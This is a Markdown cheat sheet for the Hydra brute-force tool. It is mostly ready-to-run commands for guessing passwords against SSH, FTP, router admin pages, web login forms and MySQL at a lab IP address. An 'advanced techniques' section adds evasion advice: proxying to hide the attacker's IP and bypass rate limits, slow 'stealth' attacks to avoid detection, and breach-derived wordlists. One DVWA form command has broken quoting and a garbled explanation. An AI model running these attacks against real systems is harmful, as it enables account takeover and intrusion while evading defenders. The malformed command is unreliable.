# Hydra Tool - Complete Command Reference Guide

## 1. Basic Command Structure
```bash
sudo hydra -l <username> -P <password_list> <protocol>://172.16.6.128 [options] 
```
### Key Components:
- **Target Specification**: `server service` (e.g., `172.16.6.128 ssh`)
- **Credential Input**:
  - `-l/-L` for username(s)
  - `-p/-P` for password(s)
  - `-C` for colon-separated credential file
- **Protocol Handler**: `service://` prefix (e.g., `ssh://`, `ftp://`)

## 2. Authentication Options
### Username Input
| Option | Example | Description |
|--------|---------|-------------|
| `-l` | `-l admin` | Single username |
| `-L` | `-L users.txt` | Username wordlist |
| `-C` | `-C creds.txt` | Combined user:pass file |

### Password Input
| Option | Example | Description |
|--------|---------|-------------|
| `-p` | `-p Password123` | Single password |
| `-P` | `-P rockyou.txt` | Password wordlist |
| `-e` | `-e nsr` | Additional checks: `n` - Null password, `s` - Username as password, `r` - Reversed username |

## 3. Protocol-Specific Commands
### SSH Attack
```bash
sudo hydra -L users.txt -P passwords.txt -t 4 -vV -f ssh://172.16.6.128 -s 22
```
- `-t 4`: 4 parallel connections
- `-vV`: Verbose output
- `-f`: Stop after first success
- `-s 22`: Port specification (default: 22)

### FTP Attack
```bash
sudo hydra -l ftpuser -P top100.txt -e n -w 30 ftp://172.16.6.128
```
- `-e n`: Try empty password
- `-w 30`: 30-second delay between attempts

### Router Web Interface
```bash
sudo hydra -l admin -P common_routers.txt 172.16.6.128 http-get /admin
```
- Targets basic HTTP authentication
- `/admin`: Common router admin path

### Website Login Form
```bash
sudo hydra -l user@domain.com -P web_pass.txt 172.16.6.128 http-post-form "/login:username=^USER^&password=^PASS^:F=error" -V
```
```bash
sudo hydra -L user.txt -P pass.txt 172.16.6.128 http-post-form " "/dvwa/login.php":username=^USER^&password=^PASS^&Login=Login:Login failed"
```
- `http-post-form`: Form submission attack {It finds from login form --> incept mode}
- `/dvwa/login.php`: Path of the website login form
- `username password Login`: Name of the login form input text file (username,password) and 'Login' is the name of Login button.
- `^USER^/^PASS^`: Hydra placeholders
- `F=error`: Failure string detection

## 4. Performance Tuning
| Option | Example | Description |
|--------|---------|-------------|
| `-t` | `-t 16` | Parallel connections (default: 16) |
| `-w` | `-w 15` | Wait time between attempts (seconds) |
| `-W` | `-W 60` | Server response timeout |
| `-u` | `-u` | Try all passwords per user first |

**Optimal Usage:**
- `-t 16-32` for local networks
- `-t 4-8` for WAN targets
- `-w 10+` to avoid lockouts

## 5. Output and Logging
| Option | Example | Description |
|--------|---------|-------------|
| `-vV` | `-vV` | Maximum verbosity |
| `-o` | `-o results.log` | Save output to file |
| `-b` | `-b json` | Machine-readable formats: json, csv |

**Example:**
```bash
hydra -l admin -P pass.txt ssh://172.16.6.128 -vV -o attack.log -b json
```

## 6. Advanced Techniques

### Resuming Interrupted Sessions
When running large attacks that get interrupted, Hydra allows you to resume from where you left off.

```bash
hydra -R hydra.restore
```

### When to Use:
- During long brute-force attacks
- After network disconnections
- When systems crash mid-attack

### Example:
```bash
# Start initial attack
hydra -L users.txt -P big_passlist.txt ssh://172.16.6.128 -vV

# Later resume the attack
hydra -R hydra.restore
```

### Proxy Chaining for Anonymity
Route your attacks through proxies to hide your IP address.

```bash
hydra -x http://proxy_ip:port -l username -P passlist.txt ftp://target.com
```

### When to Use:
- When target blocks your IP
- For anonymity requirements
- To bypass rate limiting

### Example:
```bash
hydra -x http://127.0.0.1:8080 -l admin -P passwords.txt ftp://172.16.6.128
```

### Attacking Non-Standard Ports
Many services run on custom ports instead of default ones.

```bash
hydra -s custom_port -l username -P passlist.txt service://target
```

### When to Use:
- For SSH on port 2222 instead of 22
- When testing custom configurations
- During security assessments

### Example:
```bash
hydra -s 2222 -l root -P ssh_passwords.txt ssh://172.16.6.128
```

### Stealth Mode Attacks
Slow, low-profile attacks to avoid detection.

```bash
hydra -l user -P pass.txt -t 1 -w 60 -vV ssh://target
```

### Technique Details:
- `-t 1` → Single connection (very slow)
- `-w 60` → 60 second delay between attempts

### Example:
```bash
hydra -l admin -P top100.txt -t 1 -w 120 -vV ssh://172.16.6.128
```

## 7. Full Command Examples
### Comprehensive SSH Attack
```bash
hydra -L employees.txt -P breachcompilation.txt -e nsr -u -t 8 -w 20 -f -vV -o ssh_cracked.log -b json ssh://172.16.6.128
```

### Stealthy Web Form Attack
```bash
hydra -l admin@site.com -P darkweb100.txt -t 2 -w 45 -vV 172.16.6.128 http-post-form "/wp-admin:log=^USER^&pwd=^PASS^:ERROR" -s 8443
```

### Router Credential Testing
```bash
hydra -C common_routers_creds.txt -t 4 -w 10 -f -vV 172.16.6.128 http-get /login
```

### Database Brute Force
```bash
hydra -L db_admins.txt -P sql_pass.txt -e n -t 3 -vV mysql://172.16.6.128 -s 3306
```

## Best Practices
- Always test credentials first with `-e ns`
- Start with `-t 4` and increase gradually
- Use `-w` to mimic human behavior
- Combine with `-f` to stop after first success
- Save results with `-o` for documentation
